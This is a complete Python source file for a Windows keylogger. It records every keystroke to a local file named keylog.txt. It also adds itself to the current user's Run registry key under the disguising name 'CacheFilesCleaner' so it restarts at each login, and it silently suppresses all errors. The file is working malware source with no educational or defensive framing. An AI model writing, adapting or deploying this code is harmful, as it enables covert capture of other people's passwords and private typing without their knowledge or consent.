from pynput import keyboard
import os
import string
import sys
import winreg

log_file = "keylog.txt"
logged_text = []

def add_to_startup():
    exe_path = os.path.realpath(sys.argv[0])
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "CacheFilesCleaner", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(reg_key)
    except Exception:
        pass

def on_press(key):
    global logged_text
    try:
        if key == keyboard.Key.space:
            logged_text.append(" ")
        elif key == keyboard.Key.enter:
            logged_text.append("\n")
        elif key == keyboard.Key.backspace:
            if logged_text:
                logged_text.pop()
        else:
            char = getattr(key, 'char', None)
            if char and char in string.printable:
                logged_text.append(char)
    except Exception:
        pass

    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write("".join(logged_text))
        logged_text = []
    except Exception:
        pass

# Setup on run
add_to_startup()

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
